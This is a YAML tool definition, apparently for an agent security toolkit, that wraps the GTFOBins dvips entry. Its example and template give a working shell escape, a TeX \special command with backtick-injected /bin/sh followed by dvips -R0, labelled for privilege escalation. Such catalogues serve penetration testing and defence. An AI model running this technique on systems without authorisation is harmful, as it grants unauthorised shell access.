---
id: text-tex-dvips
namespace: text:tex:dvips
name: dvips
description: Convert TeX DVI to PostScript, can spawn a shell via crafted DVI files.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - tex
  - latex
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 8
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: none
  disk_io: low
allowed-tools:
  - dvips
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "dvips -R0 texput.dvi"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via dvips with crafted DVI
    command: |
      tex '\special{psfile="`/bin/sh 1>&0"}\end'
      dvips -R0 texput.dvi
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/dvips/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "texlive-binaries"
    commands:
      - "apt-get install -y texlive-binaries"
---
